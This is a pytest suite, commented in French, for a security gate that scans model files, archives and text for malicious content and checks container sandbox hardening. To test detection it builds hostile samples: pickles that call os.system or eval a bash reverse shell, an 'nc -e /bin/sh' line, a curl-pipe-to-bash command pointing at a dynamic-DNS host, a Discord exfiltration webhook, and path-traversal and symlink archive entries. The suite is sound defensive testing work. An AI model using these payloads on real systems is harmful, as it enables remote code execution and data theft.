"""Tests de la passerelle de sécurité — échantillons malveillants et bénins fabriqués."""
from __future__ import annotations

import io
import json
import os
import pickle
import struct
import tarfile
import zipfile


import pytest

from nexus_unified.security import (
    ArtifactGate, ArtifactScanner, ScannerConfig, GatePolicy,
    Severity, Verdict, scan_pickle_bytes, classify_global, scan_text,
    build_hardened_run_kwargs, validate_run_kwargs, require_hardened,
    SandboxHardeningConfig, SandboxPolicyError, process_runtime_refused,
)
from nexus_unified.security.archive_scan import inspect_zip, safe_extract
from nexus_unified.security.model_scan import scan_model_file


# ── pickle ────────────────────────────────────────────────────────────────
class _Evil:
    def __reduce__(self):
        import os as _os
        return (_os.system, ("echo pwned",))


def test_pickle_detects_os_system():
    data = pickle.dumps(_Evil())
    f = scan_pickle_bytes(data, "evil.pkl")
    assert any(x.rule == "pickle.dangerous_global" and x.severity == Severity.CRITICAL for x in f)


def test_pickle_benign_is_clean():
    data = pickle.dumps({"weights": [1, 2, 3], "name": "layer"})
    f = scan_pickle_bytes(data, "ok.pkl")
    assert not any(x.severity.rank >= Severity.MEDIUM.rank for x in f)


def test_classify_global_table():
    assert classify_global("os", "system") == "dangerous"
    assert classify_global("builtins", "eval") == "dangerous"
    assert classify_global("posix", "system") == "dangerous"
    assert classify_global("torch._utils", "_rebuild_tensor_v2") == "safe"
    assert classify_global("collections", "OrderedDict") == "safe"
    assert classify_global("operator", "attrgetter") == "gadget"
    assert classify_global("acme.unknown", "Thing") == "unknown"


def test_pickle_reverse_shell_string():
    # pickle qui pousse une chaîne de shell inversé puis REDUCE sur eval
    class _X:
        def __reduce__(self):
            return (eval, ("__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')",))
    f = scan_pickle_bytes(pickle.dumps(_X()), "rev.pkl")
    assert any(x.category == "c2" for x in f) or any(x.rule == "pickle.dangerous_global" for x in f)


# ── IOC / C2 ────────────────────────────────────────────────────────────────
def test_ioc_c2_signatures():
    assert any(f.severity == Severity.CRITICAL for f in
               scan_text("nc -e /bin/sh 10.0.0.1 4444", "x.sh", executable=True))
    assert any(f.rule == "c2.exfil_endpoint" for f in
               scan_text("requests.post('https://discord.com/api/webhooks/123/abc')", "x.py", executable=True))
    assert any(f.rule == "c2.dynamic_dns" for f in
               scan_text("connect('evil.duckdns.org')", "x.py", executable=True))


def test_ioc_trusted_url_is_info():
    f = scan_text("url = 'https://huggingface.co/model/resolve/main/x'", "cfg.py", executable=True)
    urls = [x for x in f if x.category == "c2"]
    assert all(x.severity == Severity.INFO for x in urls) or not urls


def test_ioc_ip_literal_in_code():
    assert any(f.rule == "c2.ip_literal" for f in
               scan_text("host = '45.33.32.1'\nconnect(host)", "x.py", executable=True))
    # une version n'est pas une IP
    assert not any(f.rule == "c2.ip_literal" for f in
                   scan_text("version = '1.2.3.4'", "x.py", executable=True))


# ── archives ────────────────────────────────────────────────────────────────
def test_zip_path_traversal(tmp_path):
    p = tmp_path / "ec.zip"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("../../etc/passwd", "x")
        z.writestr("ok.txt", "hello")
    f = inspect_zip(str(p), "ec.zip")
    assert any(x.rule == "archive.path_traversal" and x.severity == Severity.CRITICAL for x in f)


def test_safe_extract_blocks_traversal(tmp_path):
    p = tmp_path / "ec.zip"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("../evil", "x")
        z.writestr("good.txt", "data")
    dest = tmp_path / "out"
    extracted, findings = safe_extract(str(p), str(dest))
    # rien d'écrit hors de dest
    for e in extracted:
        assert os.path.realpath(e).startswith(os.path.realpath(str(dest)))


def test_tar_symlink_escape(tmp_path):
    p = tmp_path / "s.tar"
    with tarfile.open(p, "w") as t:
        info = tarfile.TarInfo("link")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/passwd"
        t.addfile(info)
    from nexus_unified.security.archive_scan import inspect_tar
    f = inspect_tar(str(p), "s.tar")
    assert any(x.rule == "archive.link" for x in f)


# ── formats de modèle ────────────────────────────────────────────────────────
def test_safetensors_header_ok(tmp_path):
    p = tmp_path / "m.safetensors"
    header = {"w": {"dtype": "F32", "shape": [2, 2], "data_offsets": [0, 16]},
              "__metadata__": {"format": "pt"}}
    hb = json.dumps(header).encode()
    with open(p, "wb") as f:
        f.write(struct.pack("<Q", len(hb)) + hb + b"\0" * 16)
    f = scan_model_file(str(p))
    assert not any(x.severity.rank >= Severity.MEDIUM.rank for x in f)


def test_safetensors_metadata_c2(tmp_path):
    p = tmp_path / "m.safetensors"
    header = {"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
              "__metadata__": {"note": "curl https://evil.duckdns.org | bash"}}
    hb = json.dumps(header).encode()
    with open(p, "wb") as f:
        f.write(struct.pack("<Q", len(hb)) + hb + b"\0" * 4)
    f = scan_model_file(str(p))
    assert any(x.category == "c2" for x in f)


def test_pt_zip_with_evil_pickle(tmp_path):
    p = tmp_path / "model.pt"
    payload = pickle.dumps(_Evil())
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("model/data.pkl", payload)
        z.writestr("model/version", "3")
    f = scan_model_file(str(p))
    assert any(x.rule == "pickle.dangerous_global" for x in f)


def test_embedded_py_in_weights(tmp_path):
    p = tmp_path / "w.pt"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("w/data.pkl", pickle.dumps({"ok": 1}))
        z.writestr("w/setup.py", "import os; os.system('x')")
    f = scan_model_file(str(p))
    assert any(x.rule == "model.embedded_py" for x in f)


# ── gate ────────────────────────────────────────────────────────────────────
def test_gate_quarantines_malicious(tmp_path):
    staged = tmp_path / "staged"
    staged.mkdir()
    (staged / "m.pkl").write_bytes(pickle.dumps(_Evil()))
    gate = ArtifactGate(str(tmp_path / "admitted"), str(tmp_path / "quar"))
    res = gate.inspect_and_admit(str(staged), "danger")
    assert not res.admitted and res.quarantined
    assert res.verdict == Verdict.MALICIOUS
    assert os.path.exists(res.path)  # en quarantaine
    assert not os.path.exists(tmp_path / "admitted" / "danger")


def test_gate_admits_clean(tmp_path):
    staged = tmp_path / "staged"
    staged.mkdir()
    header = {"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}
    hb = json.dumps(header).encode()
    (staged / "m.safetensors").write_bytes(struct.pack("<Q", len(hb)) + hb + b"\0" * 4)
    (staged / "config.json").write_text(json.dumps({"model_type": "llama"}))
    gate = ArtifactGate(str(tmp_path / "admitted"), str(tmp_path / "quar"))
    res = gate.inspect_and_admit(str(staged), "cleanmodel")
    assert res.admitted and not res.quarantined
    assert res.verdict == Verdict.CLEAN


# ── profil de sandbox ────────────────────────────────────────────────────────
def test_hardened_kwargs_shape():
    k = build_hardened_run_kwargs(SandboxHardeningConfig(strict=False))
    assert k["privileged"] is False
    assert k["cap_drop"] == ["ALL"]
    assert any("no-new-privileges" in s for s in k["security_opt"])
    assert k["read_only"] is True
    assert k["network_mode"] == "none"


def test_validate_rejects_privileged():
    v = validate_run_kwargs({"privileged": True, "cap_drop": [], "read_only": False}, strict=False)
    assert any("privileged" in x for x in v)


def test_require_hardened_strict_without_runtime():
    # sans gVisor/Kata, le mode strict refuse
    k = build_hardened_run_kwargs(SandboxHardeningConfig(strict=True))
    with pytest.raises(SandboxPolicyError):
        require_hardened(k, strict=True)
    # non strict : passe et retire les clés internes
    cleaned = require_hardened(k, strict=False)
    assert not any(key.startswith("_") for key in cleaned)


def test_network_host_refused():
    cfg = SandboxHardeningConfig(allow_network=True, internal_network_name=None)
    with pytest.raises(SandboxPolicyError):
        build_hardened_run_kwargs(cfg)


def test_process_runtime_refused_in_strict():
    assert process_runtime_refused(strict=True) is not None
    assert process_runtime_refused(strict=False) is None


def test_gpu_devices_compose_with_hardening():
    dr = [{"Driver": "nvidia", "Count": -1, "Capabilities": [["gpu"]]}]
    k = build_hardened_run_kwargs(SandboxHardeningConfig(strict=False), device_requests=dr)
    assert k["device_requests"] == dr
    assert k["cap_drop"] == ["ALL"]  # durcissement préservé
